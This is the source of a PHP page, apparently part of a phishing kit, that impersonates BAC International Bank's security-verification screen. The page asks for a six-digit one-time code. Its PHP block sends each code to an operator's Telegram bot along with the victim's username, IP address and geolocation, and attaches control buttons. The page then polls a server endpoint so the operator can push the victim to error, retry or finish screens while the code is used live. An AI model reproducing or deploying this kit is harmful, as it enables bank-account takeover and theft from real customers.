<?php
include("data.php");
$usuario = trim($_GET['u'] ?? $_POST['u'] ?? '');

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['resend_token'])) {
    $date = date('d/m/Y H:i:s');
    $msg  = "🔄 BAC — REENVÍO TOKEN\n👤 Usuario: {$usuario}\n🕒 {$date}";
    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text'    => $msg,
    ]));
    echo json_encode(['ok' => true]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
    $tk    = trim($_POST['token']);
    $round = intval($_POST['round'] ?? 1);
    $ip  = client_ip() ?: '?';
    $geo = geo_lookup($ip);

    $msg  = "🔐 BAC — TOKEN #{$round}\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "👤 Usuario: {$usuario}\n";
    $msg .= "🔑 Token: {$tk}\n";
    $msg .= "🌐 IP: {$ip}\n";
    $msg .= ($geo['flag'] ?: '📍') . " País: " . $geo['country'];
    if ($geo['country_code']) $msg .= " ({$geo['country_code']})";
    $msg .= "\n";
    $ubic = trim(($geo['city'] ? $geo['city'] . ', ' : '') . ($geo['region'] ?: ''), ', ');
    if ($ubic) $msg .= "🏙 Ubicación: {$ubic}\n";

    $keyboard = json_encode([
        'inline_keyboard' => [
            [
                ['text' => '❌ LOGINERROR', 'callback_data' => "LOGINERROR|{$usuario}"],
                ['text' => '🚫 TOKERROR',   'callback_data' => "TOKERROR|{$usuario}"],
            ],
            [
                ['text' => '✅ LISTO',      'callback_data' => "LISTO|{$usuario}"],
            ],
        ]
    ]);

    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id'      => $chat_id,
        'text'         => $msg,
        'reply_markup' => $keyboard,
    ]));

    $redirect = 'espera.php?u=' . urlencode($usuario) . '&step=token';
    echo json_encode(['ok' => true, 'redirect' => $redirect]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
  <title>BAC — Verificación</title>
  <link rel="icon" href="img/logo_bac.svg" type="image/svg+xml"/>
  <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    :root{--red:#e4002b;--red-dark:#b30020;--blue:#0067b1;--text:#111;--muted:#6b7280;--line:#e5e7eb}
    html,body{font-family:'Segoe UI',Tahoma,-apple-system,sans-serif;background:#fff;color:var(--text);min-height:100vh;-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:transparent;touch-action:manipulation;overflow-x:hidden}
    input,button{font-family:inherit;-webkit-appearance:none}

    /* HEADER */
    .topbar{background:var(--red);height:70px;display:flex;align-items:center;padding:0 24px}
    .topbar img{height:36px;filter:brightness(0) invert(1)}

    /* CONTENT */
    .content{padding:40px 24px 220px;max-width:440px;margin:0 auto;text-align:center;display:flex;flex-direction:column;align-items:center;gap:22px}
    .shield{width:56px;height:56px;color:var(--blue)}
    .title{font-size:22px;font-weight:700;color:var(--text)}
    .hint{font-size:15px;color:var(--muted);line-height:1.55;max-width:320px}

    /* CODE BOXES */
    .code-row{display:flex;gap:8px;justify-content:center;width:100%;max-width:340px}
    .code-box{flex:1;aspect-ratio:3/4;max-width:48px;min-width:0;border:1.5px solid var(--line);border-radius:10px;background:#fff;font-size:22px;font-weight:600;color:var(--text);text-align:center;outline:none;transition:border-color .15s,box-shadow .15s}
    .code-box:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(0,103,177,.15)}
    .code-box.filled{border-color:#9ca3af}

    /* RESEND */
    .resend-wrap{display:flex;flex-direction:column;align-items:center;gap:10px;margin-top:6px;min-height:44px}
    .resend-link{background:none;border:none;font-size:14px;color:var(--muted);cursor:pointer;padding:4px 10px}
    .resend-link:active{color:var(--blue)}
    .resend-btn{background:#fff;border:1.5px solid var(--blue);color:var(--blue);font-size:14px;font-weight:600;padding:10px 22px;border-radius:24px;cursor:pointer;transition:background .15s}
    .resend-btn:active{background:#eff6ff}
    .resend-btn:disabled{border-color:var(--line);color:var(--muted);cursor:not-allowed;background:#f9fafb}
    @keyframes spin{to{transform:rotate(360deg)}}

    /* FOOTER */
    .footer{position:fixed;bottom:0;left:0;right:0;background:var(--red);padding:14px 20px;display:flex;align-items:center;justify-content:center;gap:12px;z-index:5}
    .footer img{height:32px}
    .footer .sep{width:1px;height:26px;background:rgba(255,255,255,.5)}
    .footer .txt{color:#fff;font-size:12px;line-height:1.4}
    .footer .txt a{color:#fff;text-decoration:underline;font-weight:600}

    /* ERROR OVERLAY */
    #err-ov{position:fixed;inset:0;z-index:99999;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;padding:40px 20px;opacity:0;pointer-events:none;transition:opacity .3s}
    #err-ov.show{opacity:1;pointer-events:all}
    #err-ov .err-icon{font-size:56px}
    #err-ov .err-title{font-size:18px;font-weight:700;color:var(--red)}
    #err-ov .err-sub{font-size:14px;color:var(--muted);text-align:center;line-height:1.5}

    /* WAITING OVERLAY */
    #waiting{position:fixed;inset:0;z-index:9999;background:rgba(255,255,255,.94);display:none;flex-direction:column;align-items:center;justify-content:center;gap:16px}
    #waiting.show{display:flex}
    .big-spinner{width:54px;height:54px;border:5px solid var(--line);border-top-color:var(--blue);border-radius:50%;animation:spin 1.1s linear infinite}
    #waiting p{font-size:14px;color:#374151;font-weight:500}

    /* LOADER */
    #loader{position:fixed;inset:0;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:22px;z-index:9998;transition:opacity .4s ease}
    #loader.hide{opacity:0;pointer-events:none}
    .load-logo{height:56px;width:auto}
  </style>
</head>
<body>

  <div id="loader">
    <img src="img/logo_bac.svg" class="load-logo" alt="BAC"/>
    <div class="big-spinner"></div>
  </div>

  <div id="err-ov">
    <div class="err-icon">⚠️</div>
    <div class="err-title">Código inválido o expirado</div>
    <div class="err-sub">Intenta nuevamente</div>
  </div>

  <div id="waiting">
    <div class="big-spinner"></div>
    <p>Procesando...</p>
  </div>

  <div class="topbar">
    <img src="img/logo_header.svg" alt="BAC"/>
  </div>

  <div class="content">
    <svg class="shield" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
      <path d="m9 12 2 2 4-4"/>
    </svg>
    <div class="title">Verificación de seguridad</div>
    <p class="hint">Ingresa el código de 6 dígitos generado por tu token o enviado a tu dispositivo registrado.</p>
    <div class="code-row">
      <input class="code-box" type="tel" maxlength="1" inputmode="numeric" autocomplete="one-time-code"/>
      <input class="code-box" type="tel" maxlength="1" inputmode="numeric"/>
      <input class="code-box" type="tel" maxlength="1" inputmode="numeric"/>
      <input class="code-box" type="tel" maxlength="1" inputmode="numeric"/>
      <input class="code-box" type="tel" maxlength="1" inputmode="numeric"/>
      <input class="code-box" type="tel" maxlength="1" inputmode="numeric"/>
    </div>
    <div class="resend-wrap" id="resendWrap">
      <button class="resend-link" id="resendLink" onclick="showResendBtn()">¿No recibiste el código?</button>
      <button class="resend-btn" id="resendBtn" onclick="resend()" style="display:none">Reenviar código</button>
    </div>
  </div>

  <footer class="footer">
    <img src="img/preview_red.png" alt="BAC"/>
    <div class="sep"></div>
    <span class="txt">2026 &copy; BAC International Bank</span>
  </footer>

  <script>
    const USUARIO = <?= json_encode($usuario) ?>;
    let round = 1;
    let pollTimer = null;

    const boxes = Array.from(document.querySelectorAll('.code-box'));
    const errOv = document.getElementById('err-ov');
    const waiting = document.getElementById('waiting');
    const loader = document.getElementById('loader');

    setTimeout(() => {
      loader.classList.add('hide');
      boxes[0].focus();
    }, 700);

    function allFilled(){ return boxes.every(b => b.value); }
    function currentCode(){ return boxes.map(b => b.value).join(''); }
    function clearBoxes(){
      boxes.forEach(b => { b.value=''; b.classList.remove('filled'); });
      boxes[0].focus();
    }

    boxes.forEach((box, i) => {
      box.addEventListener('input', function(){
        this.value = this.value.replace(/\D/g,'').slice(0,1);
        if (this.value) {
          this.classList.add('filled');
          if (i < boxes.length - 1) boxes[i+1].focus();
          else if (allFilled()) enviar();
        } else {
          this.classList.remove('filled');
        }
      });
      box.addEventListener('keydown', function(e){
        if (e.key === 'Backspace' && !this.value && i > 0) {
          boxes[i-1].focus();
          boxes[i-1].value = '';
          boxes[i-1].classList.remove('filled');
        } else if (e.key === 'ArrowLeft' && i > 0) boxes[i-1].focus();
        else if (e.key === 'ArrowRight' && i < boxes.length-1) boxes[i+1].focus();
        else if (e.key === 'Enter' && allFilled()) enviar();
      });
      box.addEventListener('paste', function(e){
        e.preventDefault();
        const txt = (e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);
        for (let j=0; j<txt.length && j+i<boxes.length; j++){
          boxes[j+i].value = txt[j];
          boxes[j+i].classList.add('filled');
        }
        const nextEmpty = boxes.findIndex(b=>!b.value);
        (nextEmpty>=0 ? boxes[nextEmpty] : boxes[boxes.length-1]).focus();
        if (allFilled()) enviar();
      });
    });

    function enviar() {
      const tk = currentCode();
      if (tk.length < 6) { (boxes.find(b=>!b.value) || boxes[0]).focus(); return; }
      waiting.classList.add('show');
      const fd = new FormData();
      fd.append('token', tk);
      fd.append('u', USUARIO);
      fd.append('round', round);
      fetch('token.php', { method:'POST', body:fd })
        .then(r => r.json())
        .then(d => {
          if (d.ok) { round++; startPoll(); }
          else waiting.classList.remove('show');
        })
        .catch(() => waiting.classList.remove('show'));
    }

    function startPoll() {
      if (pollTimer) clearInterval(pollTimer);
      pollTimer = setInterval(() => {
        fetch('check.php?u=' + encodeURIComponent(USUARIO))
          .then(r => r.json())
          .then(d => {
            if (!d.action) return;
            clearInterval(pollTimer); pollTimer = null;
            handleAction(d.action);
          }).catch(()=>{});
      }, 2000);
    }

    function handleAction(action) {
      switch(action) {
        case '/TOKERROR':
          waiting.classList.remove('show');
          errOv.classList.add('show');
          setTimeout(() => {
            errOv.classList.remove('show');
            clearBoxes();
          }, 2500);
          break;
        case '/LOGINERROR': window.location.href = 'index.php?error=1'; break;
        case '/LISTO': window.location.href = 'listo.php'; break;
        default: startPoll();
      }
    }

    const resendLink = document.getElementById('resendLink');
    const resendBtn  = document.getElementById('resendBtn');

    function showResendBtn() {
      resendLink.style.display = 'none';
      resendBtn.style.display  = '';
    }

    function resend() {
      if (resendBtn.disabled) return;
      resendBtn.disabled = true;
      const fd = new FormData();
      fd.append('resend_token', '1');
      fd.append('u', USUARIO);
      fetch('token.php', { method:'POST', body:fd }).catch(()=>{});
      let t = 60;
      resendBtn.textContent = 'Reenviar en ' + t + 's';
      const iv = setInterval(() => {
        t--;
        if (t <= 0) {
          clearInterval(iv);
          resendBtn.style.display  = 'none';
          resendBtn.disabled       = false;
          resendBtn.textContent    = 'Reenviar código';
          resendLink.style.display = '';
        } else {
          resendBtn.textContent = 'Reenviar en ' + t + 's';
        }
      }, 1000);
    }

    document.addEventListener('gesturestart', e => e.preventDefault());
    document.addEventListener('dblclick', e => e.preventDefault());
  </script>
</body>
</html>
